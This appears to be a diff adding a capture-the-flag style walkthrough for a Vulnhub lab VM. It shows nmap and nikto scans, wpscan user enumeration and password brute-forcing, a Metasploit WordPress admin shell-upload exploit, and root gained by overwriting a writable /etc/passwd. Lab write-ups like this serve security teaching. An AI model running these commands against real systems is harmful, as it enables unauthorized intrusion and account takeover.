@@ -1,0 +1,169 @@
+|---|---|
+|:---|:----|
+| Category: |	Small boot2root VM |
+|Platform: |	Vulnhub |
+|Vulnerability: | wordpress hacking |
+|End Goal: |	Get root |
+|Tool: | nmap, nikto, wpscan, metasploit  |
+
+## Pennetration Methodologie
+- Scan the target
+  - Find target's IP
+  - Nmap scan
+- Enumeration
+  - Nikto scan
+  - wpscan
+- Exploit
+  - Wordpress Exploit
+  - Privilege escalation
+  - Get root
+## Walkthrough
+### Scanning
+Firstly I find the target’s IP by using **netdiscover** tool, we can easily find ip of the victim machine
+```
+┌──(root㉿kali)-[/home/kali]
+└─# netdiscover -i eth0 -r 192.168.44.0/24
+
+Currently scanning: Finished!   |   Screen View: Unique Hosts                                                               17 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1020                                                           
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.44.2    00:50:56:f2:22:8b      6     360  VMware, Inc.                                                                    
+ 192.168.44.1    00:50:56:c0:00:08      1      60  VMware, Inc.                                                                    
+ 192.168.44.130  00:0c:29:0e:97:6e      8     480  VMware, Inc.                                                                    
+ 192.168.44.254  00:50:56:e3:25:b0      2     120  VMware, Inc.
+```
+Target: **192.168.44.130** 
+- Let's continue with **Nmap** scan.
+
+```
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -sV -sC -Pn -T4  192.168.44.130
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 17:24 EDT
+Nmap scan report for 192.168.44.130
+Host is up (0.00088s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.3c
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
+|   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
+|_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+MAC Address: 00:0C:29:0E:97:6E (VMware)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
+```
+From this we can see the following ports and services:
+- 21/tcp open  ftp     ProFTPD 1.3.3c
+- 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
+- 80/tcp open  http    Apache httpd 2.4.18
+Check http servive
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/26e3bb4b-1690-4ca9-8e12-d8085bc0bbea)
+
+Nothing here. Scan Web with nikto
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/547d2d58-5288-4b85-95ea-94ab2e84627a)
+
+We find a interestin folder is **secret**. When check in URL, I find wordpress login page
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/bc174807-5783-45b0-b288-fa31ccc2dce2)
+
+### Enumeration
+
+The next step is to enumerate any potential users and vulnerabilities in the site by using wpscan:
+
+```
+wpscan --url http://192.168.44.130/secret -e u
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+```
+
+I find a user that is **admin**. Let's continue to bruteforce the password of this user by ussing wpscan.
+
+```
+wpscan --url http://vtcsec/secret/ -U admin -P  /usr/share/wordlists/dirb/common.txt
+
+```
+I find the password for admin that is admin
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/950cc8d0-d279-491c-81b8-f3a8ca5aff7d)
+
+Log in with this credential
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/990c1ffb-637d-4f7c-9f92-e7a1876699fd)
+
+
+### Exploit
+- Upload php reverse shell into wordpress page. Metasploit can be used to generate a plugin which will automationally upload a payload and give us shell. Start metasploit and set options that are necessary.
+
+```
+msf6 > search wp admin shell
+msf6 > use 3
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD admin
+PASSWORD => admin
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
+USERNAME => admin
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOST 192.168.44.130
+RHOST => 192.168.44.130
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /secret
+TARGETURI => /secret
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
+```
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/4810e633-4fa2-4ee1-9e7c-5bf4d8e5b4ed)
+
+The exploit should executed successfully and open a meterpreter session. Running a getuid command from this session (or id from a shell) shows we currently have access as the user: www-data. Therefore, some additional work is required to obtain root access.
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/c3e57682-80ab-42a8-b502-329d6acd1b83)
+
+### Privilege escalation
+To check for any potential misconfigurations that could be lead to privilege escalatio, I use **unix-privesc-check** to scan. First upload **unix-privesc-check** to remote machice.
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/18b15cf9-35af-4934-bfb9-06f030b56c0e)
+
+Set excure permision for unin-privesc_check and run script.
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/06bc75c5-77c1-434d-9665-7244afa11e65)
+
+From the result, we can edit file /etc/passwd. Download /etc/passwd to local macline.
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/12f6648b-7899-465a-83f7-2c484ca9c4ee)
+
+Then, from a local terminal, we can use openssl to generate a new hashed password:
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/efd82140-dbb5-4e0d-b797-a72d57a633c5)
+
+Finally, we can edit the passwd file using vim and replace the x value for the root user with the hashed password from the above command:
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/16144723-c017-4abd-9943-7e2f58409fcd)
+
+The modified passwd file can then be uploaded to the target via the meterpreter session:
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/aa86b3a8-0a87-4e76-ac58-dccea620215e)
+
+Using the the shell command in meterpreter this can then be tranformed into an interactive bash shell via Python:
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/5d530681-ea87-4d61-b955-d9f61e7f4b97)
+
+Finally, we can su to the root user using the new password generated above:
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/40f1c099-6930-4d7d-96c8-d7214c5d5de2)
+
+Checking information of current user:
+
+![image](https://github.com/CowStupid/Vulnhub-seri/assets/169901923/8802fb73-fc59-4fff-b6bb-c78afa10db90)
+
+So we get root of this machine.
+
